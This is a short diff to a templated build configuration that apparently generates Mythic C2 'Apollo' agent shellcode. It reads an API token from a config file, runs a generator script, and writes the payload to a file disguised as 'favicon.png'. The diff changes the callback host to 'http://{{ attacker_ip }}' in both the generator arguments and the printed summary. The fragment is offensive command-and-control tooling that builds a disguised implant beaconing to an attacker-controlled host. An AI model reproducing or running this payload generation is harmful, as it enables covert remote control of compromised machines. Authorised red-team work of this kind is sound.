@@ -13,7 +13,7 @@ content: |
   grep 'mythic_api_token' ~/.config/profi/config.yaml | awk '{print $2}' | tr -d '"' > /tmp/mythic_token_tmp; \
   {{ python_path }} {{ templates_dir }}/helper_scripts/mythicConfigGenerator.py \
     --payload-type apollo \
-    --callback-host {{ mythic_callback_url }} \
+    --callback-host http://{{ attacker_ip }} \
     --callback-port {{ mythic_callback_port }} \
     --callback-interval {{ mythic_callback_interval }} \
     --callback-jitter {{ mythic_callback_jitter }} \
@@ -30,7 +30,7 @@ content: |
   echo '================================================================' && \
   echo '                   Apollo Shellcode Ready                       ' && \
   echo 'File: packstation/outbound/favicon.png' && \
-  echo 'Callback: {{ mythic_callback_url }}:{{ mythic_callback_port }}' && \
+  echo 'Callback: http://{{ attacker_ip }}:{{ mythic_callback_port }}' && \
   echo 'Interval: {{ mythic_callback_interval }}s (jitter: {{ mythic_callback_jitter }}%)' && \
   echo '================================================================'; \
   rm -f /tmp/mythic_token_tmp; \
